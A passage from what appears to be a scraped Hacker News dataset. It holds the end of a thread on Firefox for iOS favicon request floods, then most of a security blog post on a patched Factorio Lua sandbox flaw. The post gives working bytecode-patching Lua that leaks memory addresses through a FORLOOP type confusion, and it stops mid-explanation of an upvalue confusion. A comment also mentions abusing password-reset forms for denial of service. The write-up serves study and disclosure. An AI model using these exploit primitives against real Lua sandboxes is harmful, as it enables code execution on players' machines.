403s. Browsers are expected to: 1. Use the favicon specified in meta if any (we do have one, /favicon.svg) 2. Respect cache headers (immutable + multi-months max-age) 3. Not make completely random requests to things they should ignore (such as OpenGraph tags) Yes CDNs do help with these kinds of issues, but they absolutely do not fix them all. Which is why even though we have a pretty damn elaborate setup in that regard we were being annoyed by the issue. But also Firefox on iOS should be not-completely-broken. reply fnord123 10 hours agorootparentprev404s don't get cached. At least I don't configure anything to cache them. reply JimDabell 6 hours agorootparent> A 404 response is cacheable by default; i.e., unless otherwise indicated by the method definition or explicit cache controls — https://datatracker.ietf.org/doc/html/rfc7231#section-6.5.4 reply theginger 9 hours agorootparentprevThis why in a lot of contexts it would be good to at least be micro catching them. If they were cached for 5 seconds it would have covered all subsequent requests. reply yosefk 10 hours agorootparentprev404s have got to be very cheap to serve reply chiph 6 hours agorootparentNot when you're on a metered connection, or on a high latency one. Don't make your customers pay for your sloppy habits is a good policy to have. reply fnord123 17 minutes agorootparentIf the CDN returns a 404 or the origin server, then your satellite phone is still waiting. reply bandrami 8 hours agorootparentprevBut they aren't always! reply cess11 8 hours agorootparentprevPretty weird to think that running a web server also means you should operate \"a geographically distributed network of proxy servers and their data centers\". I also think it's pretty weird to defend thoroughly defect software with \"waste ful, sure, but hardly that big a deal\". reply seism 11 hours agoparentprevAlso, when I saw the headline, I had to think of all the LLM scrapers and bots (soon to be running directly on your AIphone!) roaming the Interwebs. reply quaintdev 11 hours agorootparentJust yesterday I blocked the bots from my blog using this[1]. Of course whether these bots respect robots.txt nowadays is a different question altogether [1]: https://github.com/fardog/fardog.io/commit/b2e3eac838ea25209... reply fartfeatures 9 hours agorootparentThey do not: https://news.ycombinator.com/item?id=40759916 reply WesolyKubeczek 9 hours agoparentprevI can easily have hundreds of Chrome tabs open, and none of this happens. I can have hundreds of tabs inadvertently open in iOS Safari, and none of this happens. Would you kindly refrain from blaming users for what clearly is a bug in the application? reply cwillu 8 hours agorootparentHell, I have hundreds of tabs open on firefox on my android phone, and none of this happens. reply AtlasBarfed 11 hours agoparentprevI thought all browsers on iOS were using the apple browser engine and ditto for Android. That is, they are just skins reply JimDabell 11 hours agorootparentThey are using the WebKit rendering engine, but there’s a lot more to a web browser than just its rendering engine. They aren’t just skins. reply ctxc 10 hours agorootparentCould you add a more to that? What other complex parts are built by FF? reply JimDabell 6 hours agorootparentWhy the “complex” qualifier? The code responsible for the incorrect favicon URL bug is very simple, and part of the Firefox codebase not WebKit: https://github.com/mozilla-mobile/firefox-ios/blob/bd589c194... Firefox on iOS has about 200k lines of Swift. As a rough rule of thumb, everything that isn’t directly related to rendering something within the page or executing JavaScript is Firefox code not WebKit code. So bookmarks, syncing, tabs, etc. reply matsemann 8 hours agorootparentprevNot necessarily complex, but the tab switcher etc is built by Firefox, and probably is what tries to load the favicons to display the icon somewhere? reply fmbb 10 hours agorootparentprevWhat do you think is complex? reply mcfedr 10 hours agorootparentprevYea, that's basically it on iOS, although there is a bunch ux, so it's not nothing On android, browsers can ship their own engines, and they do. There is actually some freedom on android. reply dizhn 8 hours agorootparentprevThis changed very recently due to EU rules reply markerz 11 hours agoprevOh hey, I wrote that last issue linked! What crazy Deja vu. Here’s me discovering the issue that led me to find some wild behavior. Basically Firefox loaded favicons 4x the number of tabs opened to that website. It would do this every time I opened or closed any tab. https://aggressivelyparaphrasing.me/2022/12/12/why-does-my-l... It was resolved a while back so maybe it’s similar symptoms but different root cause, or maybe it’s people using older versions? reply gwd 10 hours agoparentWordpress handles 404s really slowly? I'm kind of surprised it works at all then, as at least in my logs there's a very steady stream of bots probing it for vulnerabilities by trying random URLs. reply markerz 2 hours agorootparentI managed to get around it with litespeed Cache which does cache 404 pages. I was previously using WP Super Cache which does not. Note I also wasn’t running a CDN so there’s no reverse proxy cache either. Over time, I found that BetterLinks was slowing down my site significantly (600ms) . It wasn’t like this when I first investigated. It became slow over the course of a year or so. I ended up replacing it with Simple 301 Redirects. I think this is a separate issue though, unrelated to my original overload, but looked very similar to when Firefox DOSed my site. I experimented with CDNs to cache things reverse proxy style as a catch all. Eventually I caved and enabled Cloudflare CDN because QUIC.cloud kept having problems where a POP node kept hitting 403 Forbidden. I’d say the site is pretty functionally performant now. I think most sites that claim Wordpress handles high loads really well have at least two layers of caching in front of it and are running on dedicated boxes. Remove both of those and suddenly it’s super easy to DOS. Another common DOS exploit is to repeatedly spam the Forgot Password form, since there’s a lot of guaranteed processing with that and it’s not cacheable. I hid mine behind a captcha which helps a lot. reply swiftcoder 8 hours agorootparentprevIt may intentionally 404 slowly? One web service I worked on added a few hundred milliseconds delay in returning 404s to slow down this kind of probing attack reply gwd 7 hours agorootparentOoh, that's a good idea actually. But it doesn't explain this: > If I click enough, I’d eventually see HTTP 503 Service Unavailable. That normally only happens when the reverse proxy has a timeout, which would normally only happen when the backend was completely overloaded. Unless WP has an exponential delay, and the 503 is just the exponential delay becoming longer than the reverse proxy timeout? But why would the main page that the guy is loading say 503, when random non-critical parts like favicon.ico get a 503? Unless the exponential delay is per IP address -- so all the misses to favicon.ico are actually slowing down the main connections past the reverse proxy timeout? EDIT: Actually, no, they have graphs of the server actually spiking memory and CPU usage; you'd expect intentional exponential delay to reduce memory and CPU usage. reply jepler 6 hours agoprevThe author of this site usually takes pains to obfuscate whatever big commercial entity she's talking about who did dumb stuff. But when it's Firefox, she names names. Huh. reply batch12 5 hours agoparentThe post would be pointless if it didn't identify the browser in question. reply yuliyp 2 hours agoparentprevThe author obfuscates her employers. Stuff she discovers as an end user will get named. reply Aloha 5 hours agoparentprevNo - as someone who reads her on feed - not particularly, and only in certain cases. reply bennettlp 11 hours agoprevI remember something similar with Internet Explorer back in the day, where it would ask for the favicon (which we didn’t have setup at the time) so our 404 page would be returned, which then seemed to trigger another request for a favicon. (╯°□°)╯︵ ┻━┻ reply jb1991 12 hours agoprevInteresting. From a user experience, Firefox for iPhone has been a really excellent app, it’s been my preferred browser for years. reply rrr_oh_man 11 hours agoparentEven if it’s basically a skin for Safari? reply fastily 10 hours agorootparentNot for long. Apple just started allowing 3rd party browser engines in the EU https://www.theverge.com/2024/1/25/24050478/apple-ios-17-4-b... reply dspillett 9 hours agorootparentOnly in the EU because of that ruling. IIRC they are not implementing the requirement elsewhere (though they might eventually if the difference gets sufficient bad press or becomes technically inconvenient). reply fmbb 10 hours agorootparentprevIs it? I thought it was basically Firefox with another HTML rendering engine (and I guess javascript runtime). reply immibis 10 hours agorootparentThose are the main parts of the browser. reply swiftcoder 8 hours agorootparentThey are large parts of the browser, certainly. But they don't encompass all the fun network, fetch, and caching behaviour entailed in this issue. reply jb1991 9 hours agorootparentprevI don’t know how they are doing it differently, but it’s definitely a different experience than Safari. reply benoliver999 8 hours agorootparentprevYeah I like FF sync to move tabs and send stuff to other devices. I have an android phone, an iPad and a Linux PC. reply userbinator 12 hours agoprevIt's not part of individual directories. That would be stupid. Having a path-specific favicon actually sounds like a feature. reply missblit 11 hours agoparentAnd it is a feature. https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes... reply Aachen 8 hours agorootparentI use this daily to tell different projects on my website apart by icon, both in browser tabs and in bookmarks reply Kwpolska 11 hours agoparentprevIt is quite easy these days if you definetags to specify the icon (as opposed to depending on files being in the right places). reply chime 12 hours agoparentprevLong ago, I implemented that by pragma no-cache and checking the referrer. It wasn’t perfect but it worked for most users. reply justsomehnguy 10 hours agoparentprev> Having a path-specific favicon actually sounds like a feature. Can you provide at least a couple of use-cases for a path specific favicons? reply userbinator 10 hours agorootparentSites where users each get a directory for their profile. reply shagie 4 hours agorootparentIf the url is server.com/users/jsmith/hobbies/fun/photography.html then how many directories should be probed for a favicon? Is that also the correct behavior for trying to identify a favicon for something like docs.oracle.com/javase/8/docs/api/org/xml/sax/helpers/DefaultHandler.html reply justsomehnguy 10 hours agorootparentprevThese can be solved byor something. Do this require a browser probing every path with /favicon.ico? reply 6510 8 hours agorootparentNot every file displayed in a browser is a html document. reply Symbiote 8 hours agorootparentThen put the location in an HTTP Link header. reply dspillett 9 hours agorootparentprevMany. Though they aren't common enough that it needs to be a built-in, especially as you can already specify a page specific icon via a link tag in your page's head which every up-to-date stable browser has had support for since 2010 or before (ref: https://caniuse.com/?search=link-icon). reply vasco 11 hours agoparentprevThat's the point the author made. reply alexchamberlain 11 hours agoprevThere are some suggestions on https://stackoverflow.com/q/1321878/961353 for disabling the favicon request completely. reply shantara 8 hours agoprevI recall seeing some users complain about getting a temp ban on a niche forum when using Firefox for iOS, which was probably caused by this issue. reply instagib 1 hour agoparentI occasionally get this from some sites. Sometimes switch to safari or reset Firefox fixes it. I use Firefox as a quick lookup because the tabs crash often and it hardly ever saves the websites I was on when re-opening. So far I have crashed safari and lost all my tabs once ever. Firefox focus does a pretty good job too for quick lookups. reply perfect_wave 12 hours agoprevI use Firefox for iPhone. Sorry At least if probably wastes less energy than messing around with generative AI reply johnp_ 6 hours agoprevHere's the code, for those interested in finding the bug: https://github.com/mozilla-mobile/firefox-ios/tree/main/Brow... reply lopkeny12ko 6 hours agoprev> And yet, this thing decides to beat the shit out of the web server while trying to get it. This is an exhorbitant exaggeration. They are duplicated requests for a favicon. Not only is that a tiny resource, most of these requests are 404ing which is cheap. And even if it isn't 404, your favicon is a tiny static asset, it should either be served by CDN or in the server's filesystem cache anyways. reply yokoprime 8 hours agoprevI get it, everything adds up and over millions of page-loads there will be a bit of wasted bandwidth. But it seems the original author blew this issue out of proportion with this post. Why even be annoyed by such a minor issue? reply ggm 12 hours agoprevI have to laugh when the robots fetch the .ico file reply dspillett 9 hours agoparentI'm sure some do that deliberately, to remove one way to identify bots automatically and block them or give them bad content. reply fnord123 10 hours agoprevNow let's see the savings from not talking to ad servers and running the Javascript from those trackers. reply justsomehnguy 10 hours agoprevMakes me wonder what it would do if you throw a couple of 301/307/308 at it. reply mock-possum 11 hours agoprevTitle implies that this article thirdly explains how to waste annoying sysadmins, which is an entertaining prospect. Are we talking about not putting annoying sysadmins to good use? Or are we talking about, you know, makin sure they don’t cause nobody no trouble again, boss? reply hulitu 12 hours agoprev> First up, why in the hell do you need to request the same link 12 times? No, scratch that, 15 times, since it does 3 more after getting the css and feed icon. It makes a debouncing. It compares the result with the previous to be sure it is OK. /s reply CarRamrod 10 hours agoprevnext [3 more] [flagged] EdwardDiego 10 hours agoparentAre you commenting on the right post mate? reply codetrotter 9 hours agorootparentIt’s extra funny because just a few days ago he wrote a comment that was a link to an image hosted on Reddit. Of course he could’ve just gotten the link from Google Images and not noticed. But I would rather like to imagine that he himself is one of the “Redditors” he apparently so vehemently despises. reply globular-toast 11 hours agoprev [–] This isn't a very constructive post. Are we supposed to believe this is the only inefficient and buggy software out there? Seems weird to call out a particular project like that. reply swiftcoder 8 hours agoparentThis isn't a very constructive comment. Are we supposed to believe that one can never criticise any piece of software, ever, on the off-chance that some other piece of software, somewhere, once contained a similar issue? reply pjmlp 8 hours agoparentprev [–] I for one, have no patience for Feel Good culture. reply klabb3 7 hours agorootparent [–] I'd just like to interject for a moment. What you're referring to as Fell Good culture, is in fact, toxic positivity/Feel Good culture, or as I've recently taken to calling it, toxic positivity plus Feel Good culture. reply pjmlp 7 hours agorootparent [–] Yeah, spot on. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The post discusses inefficiencies in web browsers, specifically highlighting how Firefox for iOS repeatedly requests the same links and incorrectly requests favicons, leading to unnecessary bandwidth and battery usage.",
      "This behavior causes strain on servers and can be particularly annoying for system administrators who manage these servers.",
      "The example provided shows multiple identical requests and an incorrect favicon request, illustrating the problem and its impact on server resources."
    ],
    "commentSummary": [
      "The discussion revolves around the performance and usability of Firefox on iOS and Android, with mixed opinions on its efficiency and features.",
      "Key points include the limitations imposed by iOS requiring browsers to use WebKit, and the recent allowance of third-party browser engines in the EU since iOS 17.4.",
      "Users highlight issues such as slow performance, bugs, and the importance of ad-blocking plugins like uBlock Origin, which significantly enhance the browsing experience on mobile devices."
    ],
    "points": 253,
    "commentCount": 126,
    "retryCount": 0,
    "time": 1719641270
  },
  {
    "id": 40830005,
    "title": "Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws",
    "originLink": "https://memorycorruption.net/posts/rce-lua-factorio/",
    "originBody": "Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws Dynamic languages are safe from memory corruptions bugs, right? 29/06/2024 Research Pwn Lua Some months ago I exploited a vulnerability in the Lua implementation of Factorio that allowed a malicious server to obtain arbitrary execution on clients. As the vulnerability has been patched for months already (Factorio versions below 1.1.101 are affected), is time to share the details with the community. I think this is a very interesting topic, that can serve as an introduction to understand other dynamic languages such as Javascript, where similar ideas are used for exploitation. For this reason, this is an in-depth explaination of the vulnerability, so that it can be used by others as a reference to understand how these attacks work. In addition to this, at the end of the post you will find a challenge to practice the techniques explained in this post in a gamified environment, directly in your browser. You can jump directly to the challenge: Your Turn What is Factorio? Factorio is a game in which you automate a factory to build a rocket and escape from a planet. Based on their website, they have sold more than 3,500,000 copies of the game , making it a juicy target for security researchers How is Lua used in the game? Lua is used in Factorio to implement some game logic and to create mods and custom maps that can be downloaded from in-game or from their website . The modding community is very active, so there are thousands of mods available, some with even more than half a million downloads The Alien Biomes mod has 551K downloads Based on this information, it might seem that the surface of the Lua interpreter in the game is limited to local exploits that require the user to download a malicious mod. That would already be an issue, as compromising one mod (either finding a vulnerability in it / compromising the source) has the potential to reach millions of users, but we are missing a small detail that exposes the lua interpreter to the network, opening the door to more interesting attacks The more the merrier On the Factorio wiki there is a very important implementation detail of the multiplayer mode: Factorio multiplayer code uses deterministic lockstep to synchronize clients. This is a method of synchronizing a game from one computer to another by sending only the user inputs that control that game, rather than networking the state of the objects in the game itself. It means that all player’s games need to simulate every single tick of the game identically. If any computer does something ever-so-slightly different, a desynchronization (desync) occurs. The game includes processes to ensure any issues with network traffic do not cause desyncs. That means that if one player executes some Lua code, the rest of the players must execute it in order to preserve the syncronization of the game. Failing to do so will result in a desync state, disconnecting the client from the game with an error message, as also seen in the wiki So we now know that any Lua code we execute is also executed by the rest of players. What are our options to execute lua code? After some research, we end up with two options: Use the /c command to execute Lua code in a server (if we have permission to do it) Creating a custom map that contains lua code so it gets executed when a client connects to the server As both options require privileges on a server, we might as well go for the second path. As the game also features an in-game server browser, an attacker could make it visible there to atract victims. Going Deeper General Exploitation Path Now that we have a clear path to reach the Lua interpreter from the network, let’s take a quick look at the general exploitation path that we will follow: We host a Factorio server that is serving a malicious map. This map will contain our exploit as part of the Lua code that defines the scenario of the map When a client connects to our server, they download the map and execute the Lua code associated with it (as we have seen before, as state is not shared, clients need to execute the Lua code to ensure syncronization between them) Our payload will leverage weaknesses in the Lua implementation to craft fake objects These fake objects will allow us to leak/corrupt memory to alter the behaviour of the program We follow one of the many techniques to gain code execution by leveraging these powerful primitives A small leak will sink a great ship As one can imagine, the official Lua interpreter contains modules that allow scripts to interact with the host in multiple common ways, such as opening files, executing commands, getting environment variables… While this might be desirable on normal circumstances, is definitely not okay when executing untrusted code. For this reason, a basic hardening recommendation is to completely disable these modules when compiling Lua for those sensitive environments. This is the case in Factorio too, where only the following modules are compiled: debug - Provides Access to Debug functionalities math - Interface to standard C Math bit32 - Bitwise operations string - Manipulation of strings table - Manipulation of tables base - Core Functions of Lua, such as print However, the devil is in the details, and while modules that have names like os with functions like execute are easily recognizable are dangerous, others like load or loadstring that are part of the base module might be seem as benign, while they are arguably the most powerful functions of Lua. Why are these functions so powerful? Because they allow executing bytecode. Who controls the Bytecode controls the future Lua is an interpreted language, but it doesn’t execute the code we write as it is, first, it is compiled. This might be a surprise to some, as it seems to be incompatible with the classic view of an interpreted language. However, details are important, Lua doesn’t compile to machine code, that is, code that your CPU understands. Instead, it compiles into Lua bytecode, which is a representation of the code that can only be executed by the Lua interpreter, making it still an interpreted Language. Source code is useful for humans, as it is easily readable, but text is hard to work with for computers, so bytecode is a more useful representation for them. Let’s see this in practice so we get a clearer view of how this works. If we have the following code: print(\"MemoryCorruption\") Lua is going to generate and execute the following bytecode: All the bytecode snippets in this post were created with luac -l -l . luac is provided together with the Lua interpreter 1 GETTABUP 0 0 -1 ; _ENV \"print\" 2 LOADK 1 -2 ; \"MemoryCorruption\" 3 CALL 0 2 14 RETURN 0 1Without knowing anything about bytecode, we can see that somehow Lua is getting the function print, loading a constant MemoryCorruption, calling print and finally returning. This bytecode is what gets executed by the interpreter, there are no more conversions or checks. This is why being able to execute bytecode directly is so powerful, because you gain the ability to execute incorrect bytecode that under normal circunstances, the compiler would never generate For example, what happens if I modify the previous LOADK opcode, that is used to load a constant to use a Out-Of-Bounds index? Does the interpreter prevents me from doing that? Or does it leak memory? Bytecode Verifier Aware of the dangers of directly executing bytecode, Lua developers implemented a bytecode verifier in an attempt to protect the interpreter from malicious bytecode. However, it was removed in version 5.2 as it was repeatedly found to be bypassable Following several bytecode exploits found by the relentless Peter Cawley and others, we are considering dropping the bytecode verifier completely in Lua 5.2. It seems useless to make a promise that we can’t seem to deliver without a much more complicated verifier than the current one, and possibly with the need for costly runtime checks as well. Our impression is that applications that are open to running arbitrary Lua code provided by the user should avoid accepting precompiled scripts. So we think that adding a flag to load (the Lua function from the base library) to check for and reject precompiled scripts is enough for Lua-based apps to be able to reject precompiled scripts if they want to. We don’t think anything else is needed in the C side, since you can always write you own lua_Reader function to reject precompiled scripts. At the same time, shedding the bytecode verifier would allow applications that run their own precompiled scripts that are deemed safe to avoid the cost of the bytecode verifier. The checks would be limited to the sanity tests done in lundump.c, which should be enough for flagging accidental file corruption. All feedback is welcome. Thanks. –lhf 1 Even if the official bytecode verifier was not implemented in Lua 5.2.1, Factorio developers seem to have implemented their own in an attempt to protect the Lua interpreter2. These protections focused primarly in avoiding clearly OOB parameters, like trying to jump outside the code or loading a constant with an index bigger than the constants array This bytecode verifier had some Off-By-One issues, as some opcodes can be a little confusing. For example, JMP 0 does not really make sense, as it would basically make an infinite loop, so the jump opcode is offset by one by default. This wasn’t taken into account in the verifier, so it was possible to jump outside the code block. This was an issue by itself as there exists the possiblity that the constants are allocated just after the code chunk, so an attacker could store bytecode in the constants section to bypass the checks and then jump to it with the off by one. As Lua ignores malformed instructions, the metadata of the chunk would be ignored in most cases, resulting in execution of the constants as bytecode. Building Blocks In interpreted languages such as Javascript and Lua, an incredibly powerful primitive is the ability to create fake objects. This is because it allow us to leverage the full power of the interpreter in our advantage; Strings can be used to leak arbitrary data, arrays allow to write to arbitrary memory and if the language has a way to call native functions, we can use it to control the execution flow. In addition to this, exploitation can be as complex as we need, as our exploit can make decisions and calculate values dynamically, because at the end we are still executing Javascript/Lua code. For these reasons, our goal is to gain the ability to create these fake objects. To fulfil this goal, we basically need two things: The ability to leak addresses: this will allow to place our fake objects in strings, as we will be able to locate them in memory A way to retrieve an object from an address: if we can retrieve an object from an arbitrary address, we can use the addresses leaked to get fake objects Leaking Addresses Normally, leaking addresses in Lua is a feature of the print function: [MemoryCorruption src] ./lua -e 'function foo() end print(foo)' function: 0x1673490 However, not only this was removed in Factorio, it also doesn’t leak the address of strings, which we want to use to store our fake objects. That means that we will have to craft our own primitive to leak addresses. A common way to leak addresses in Lua is by leveraging type confusions between objects. Introduction to TValues To understand how a type confusion leads to leaking addresses, we first need to understand how objects internally work in Lua. As we know, Lua is a dynamic language, so a variable can change its type during runtime: foo = \"A\" print(foo) -- Output: A foo = 1 print(foo) -- Output: 1 foo = print print(foo) -- Output: function However, Lua is written in C, which is a static language, that means that the type of variables is set on stone after compilation. How is possible to build a dynamic language on a static one? Like most things in Computer Science, by adding another abstration layer. Internally in Lua, objects are represented with the TValue structure pwndbg> ptype TValue type = struct lua_TValue { Value value_; int tt_; } Where the tt_ attribute defines the type of the TValue and the Value attribute is used to access the object represented by the TValue. As we can see, by doing this, Lua can easily implement dynamic types. In Lua, everything is a TValue, so changing the type of a variable just means replacing one TValue with another TValue. When doing operations with the TValues, Lua just has to check the tt_ property to know how to access it and what operations are valid. Inside the Value union we have the value of a TValue: pwndbg> ptype /o Value type = union Value { /* 8 */ GCObject *gc; /* 8 */ void *p; /* 4 */ int b; /* 8 */ lua_CFunction f; /* 8 */ lua_Number n; /* total size (bytes): 8 */ } As we can see, it is basically a space of 8 bytes that is interpreted either as a double or as a pointer to another structure depending on the type of the TValue. Notice how numbers are an special case. Lua represents all numbers as doubles3, so there is no need to use a pointer to access it, they can be stored inline in the Value union to save space and make access faster, as they have the same size of a pointer. This detail is KEY to leaking pointers in Lua (and also in V8!). If we can make Lua think our String is a Number, instead of accessing the Value union as a pointer, it will be accessed as a double. That means that the pointer of the string will be used as a double, which might allow us to leak it depending on how is used. FORLOOP A common place to confuse the types of objects is in loops 4. If we can make Lua think any object passed as the initial start point of a numeric loop is a number, we could leak its address, as it would be available to us as a variable. In Lua, loops are implemented by the FORLOOP opcode. This opcode is always preceded by a FORPREP opcode on numeric loops that checks the type of the arguments and prepares the loop. vmcase(OP_FORPREP, const TValue *init = ra; const TValue *plimit = ra+1; const TValue *pstep = ra+2; if (!tonumber(init, ra)) luaG_runerror(L, LUA_QL(\"for\") \" initial value must be a number\"); else if (!tonumber(plimit, ra+1)) luaG_runerror(L, LUA_QL(\"for\") \" limit must be a number\"); else if (!tonumber(pstep, ra+2)) luaG_runerror(L, LUA_QL(\"for\") \" step must be a number\"); setnvalue(ra, luai_numsub(L, nvalue(ra), nvalue(pstep))); ci->u.l.savedpc += GETARG_sBx(i); ) That means that if we try to leak the address of a function with a loop without messing with the bytecode… foo = function(x) for i = x, 100000000000000, 0 do return i end end print(foo(foo)) We get an error due to passing a function instead of a number as the for value ./lua: poc.lua:2: 'for' initial value must be a number stack traceback:poc.lua:2: in function 'foo'poc.lua:5: in main chunk[C]: in ? However, if we check the code of the FORLOOP opcode, the step parameter type is not checked, and there is even a comment saying that it is fine vmcase(OP_FORLOOP, /* not checking ra+2, because I don't see way how to exploit it not being number */ if (!ttisnumber(ra+1)!ttisnumber(ra)) luaG_runerror(L, LUA_QL(\"for\") \" bytecode error, control variables need to be numbers\"); lua_Number step = nvalue(ra+2); lua_Number idx = luai_numadd(L, nvalue(ra), step); /* increment index */ lua_Number limit = nvalue(ra+1); if (luai_numlt(L, 0, step) ? luai_numle(L, idx, limit): luai_numle(L, limit, idx)) { ci->u.l.savedpc += GETARG_sBx(i); /* jump back */ setnvalue(ra, idx); /* update internal index... */ setnvalue(ra+3, idx); /* ...and external index */ } ) As step is not type checked, its value will be passed to the nvalue call to get its value lua_Number step = nvalue(ra+2); Where nvalue is a macro used to access the number contained in a TValue that represents a number #define nvalue(o) check_exp(ttisnumber(o), num_(o)) check_exp is another macro that triggers a Lua assert if the first parameter is not true. As the ttisnumber macro checks if the object passed is a Number, this check seems to prevent us from confusing types on Lua. However, the check_exp macro has to be enabled on compile time to trigger an assert and by default does nothing /* internal assertions for in-house debugging */ #if defined(lua_assert) #define check_exp(c,e)(lua_assert(c), (e)) #else #define lua_assert(c)((void)0) #define check_exp(c,e)(e) #endif As this assertion is disabled, type is not checked and the num_ macro is executed with any object we pass to the function, leaking the value of the Value attribute of the TValue passed (which can be a pointer) #define val_(o)((o)->value_) #define num_(o)(val_(o).n) All this means that if we craft our own bytecode, we could leverage the type confusion and leak addresses. This is an example of why the ability to execute our own bytecode is so powerful, it allows us to create circunstances that the compiler would never generate from source code. Let’s craft our own bytecode to exploit this vulnerability. The bytecode generated by the compiler is the following, notice how the FORLOOP opcode is preceded by a FORPREP opcode. 1 [2] LOADK1 -1 ; 0 2 [2] LOADK2 -2 ; 1000000000000 3 [2] MOVE3 0 4 [2] FORPREP1 1 ; to 6 5 [2] RETURN4 2 6 [2] FORLOOP1 -2 ; to 5 7 [3] RETURN0 1 We can patch this opcode to remove the type check and leverage the type confusion in FORLOOP, as there is no check in the bytecode verifier that prevents us from removing it1 [2] LOADK1 -1 ; 02 [2] LOADK2 -2 ; 10000000000003 [2] MOVE3 04 [2] JMP0 1 ; to 65 [2] RETURN4 26 [2] FORLOOP1 -2 ; to 57 [3] RETURN0 1 With this change we can start leaking addresses. Let’s try to leak the address of a string asnum = loadstring(string.dump(function(x) for i = 0, 1000000000000, x do return i end end):gsub(\"\\x61\\0\\0\\x80\", \"\\x17\\0\\0\\128\")) foo = \"Memory Corruption\" print(asnum(foo)) Running this code gives us an odd double value [MemoryCorruption src] ./lua poc.lua 2.1944577826691e-317 As we have seen before, all numbers in Lua are represented as doubles3, so when we try to leak a pointer, Lua thinks the value is also double. However, pointers are not doubles, so they are not encoded as such, leading to odd values when used as doubles. As we already know that Lua doesn’t have integers, we need a way to properly encode the pointers as doubles to obtain the real value. And for that, we first need to understand what are floating-point numbers. IEEE 754 double-precision Doubles are represented using the IEEE 754 binary64 format. In this format, they are formed by three parts: Sign: 1 bit Exponent: 11 bits Mantissa: 52 bits Sign: 1 bit. Exponent: 11 bits. Mantissa: 52 bits So they are basically 64 bits of data, nothing makes them intrinsically different from an integer, the only difference is the way bits get interpreted. We already knew this, as this is what allows them to be stored inline in the Value union This also means that in Python we can just pack it to bytes an then unpack it as a integer to obtain the pointer we leaked, as they have the same size. This only works in our case as the leak is a “fake” floating-point number. Doing this for real floating-point numbers will lead to errors import struct # Convert the floating-point number to a number double_bytes = struct.pack(' exponent = 42 - 1023 = -981 encoded_exp = 11111010000 = 2000 -> exponent = 2000 - 1023 = 977 As you might already notice, if the exponent has 11 bits, that means that it can represent 2**11 = 2048 possible values, but we are missing two, when they are all 0 and when they are all 1. This is because they have an especial meaning: encoded_exp = 00000000000 means that the number is denormalized (or a signed zero if the mantissa is 0) encoded_exp = 11111111111 means Inf (if mantissa 0) or NaN (if mantissa is not zero) This explains why our pointer has an ood value. Lua thinks it is a denormalized number as the exponent was zero while the mantissa was not zero. Denormalized numbers are basically very small numbers. For a double, they start at values smaller than 2**-1022 8 print(string.format(\"%.13a\", 2^-1022)) -- Output: 0x1.0000000000000p-1022 (Value different from 0x0 means normal number) print(string.format(\"%.13a\", 2^-1023)) -- Output: 0x0.8000000000000p-1022 (0x0 means denormalized number) This is also why the exponent of our leaked value was -1022. As our number was denormalized and it was indicated by the first part of the output, the exponent is no longer useful for us (as it only indicated that is denormalized, which we already knew), so it seems to be fixed at -1022, the smallest representable exponent. Are we double yet? There are basically two cases we need to handle: Denormalized Numbers: the integer value fits in the mantissa, we decode the mantissa to obtain the correct double. Normal numbers: the value does not fit in the mantissa. The best we can do to recover the original value is to calculate the number as (exponent + 1023) * 2^52 + mantissa (if the number is not representable as a double, we lose data doing this) If we really wanted to handle any number without losing data, we could store the value in two doubles and make functions to operate with them as an integer Here is a Lua implementation of this idea: function double_to_number(double) -- Force representation of mantissa with 13 bytes of precision local double_as_string = string.format(\"%.13a\", double) local denormalized, mantissa, exponent = string.match(double_as_string, \"-?0x([a-fx0-9]*).([a-f0-9]*)p?(-?[0-9]*)\") -- Convert to number denormalized = tonumber(denormalized, 16) mantissa = tonumber(mantissa, 16) exponent = tonumber(exponent) if denormalized == 0 then -- If denormalized, it means that the leaked value had zeros -- in the position of the exponent -- That means the number fits the mantissa, -- so we don't have to do anything with our new double to represent it real_exponent = 0 else -- In this case, the leaked value had a value different -- value from zero in the exponent. -- That means the number does NOT fit the mantissa. -- We need to calculate the real value and then -- try to represent it as a double real_exponent = (exponent + 1023) * 2^52 -- Shift 52 bits (size of mantissa) end return real_exponent + mantissa end Which we can finally add to our FORLOOP code to transform the leaked pointer foo = \"Memory Corruption\" leak = asnum(foo) print(\"Leak: \" .. leak) print(string.format(\"Pointer: 0x%x\", double_to_number(leak))) -- Output: -- Leak: 2.1965605260578e-317 -- Pointer: 0x43d6c0 We can then check in GDB that 0x43d6c0 is in fact the correct pointer: pwndbg> x/20s 0x43d6c0 0x43d6c0: \"\\340nC\" 0x43d6c4: \"\" 0x43d6c5: \"\" 0x43d6c6: \"\" 0x43d6c7: \"\" 0x43d6c8: \"\\004\\002\" 0x43d6cb: \"\" 0x43d6cc: \"\\222\\311X+\\021\" 0x43d6d2: \"\" 0x43d6d3: \"\" 0x43d6d4: \"\" 0x43d6d5: \"\" 0x43d6d6: \"\" 0x43d6d7: \"\" 0x43d6d8: \"Memory Corruption\" 0x43d6ea: \"\" 0x43d6eb: \"\" 0x43d6ec: \"\" 0x43d6ed: \"\" 0x43d6ee: \"\" Our string is not exactly at the address leaked as we leaked the address of a TString structure, the internal representation of strings in Lua type = union TString { /* 8 */ L_Umaxalign dummy; /* 24 */ struct { /* 08 */ GCObject *next; /* 81 */ lu_byte tt; /* 91 */ lu_byte marked; /* 101 */ lu_byte extra; /* XXX 1-byte hole */ /* 124 */ unsigned int hash; /* 168 */ size_t len; /* total size (bytes): 24 */ } tsv; /* total size (bytes): 24 */ } The real string is after this header, that is, 24 bytes after the leaked pointer: pwndbg> x/s 0x43d6c0+24 0x43d6d8: \"Memory Corruption\" Confusing Upvalues Now that we have a way to leak addresses, we need a primitive that allows us to retrieve fake objects. To do this, we first need to understand how upvalues and Closures work in Lua. What are Upvalues? Upvalues are a way to access variables outside the scope of the current function. Consider the following example that calculates the Fibonacci secuence: function fibonacci(n)local a = 1local b = 1function nextValue() -- 'a' and 'b' are upvalues, as they are defined in the outer function return a + bendfor i=0, n do tmp = a a = nextValue() b = tmpendreturn b end The nextValue function accesses both a and b variables even if they are outside its scope, that is because both variables are defined as upvalues. We can see that this is true by taking a look at its bytecode: upvalues (2) for nextValue:0 a 1 11 b 1 2 The format of the upvalues section is the following: Index: position in the upvalues array of the function Name: name of the upval In Stack: indicates if the upval is located in the stack (one if located in the stack) Stack Index: offset of the upval from the base address of the stack So we know that both a and b are upvalues located in the stack, with a located at base + 1 and b at base + 2 The Gift that Keeps on Giving As you might start thinking, we control the bytecode that gets loaded, and upvalues are defined in the bytecode, what happens if we modify the index of an 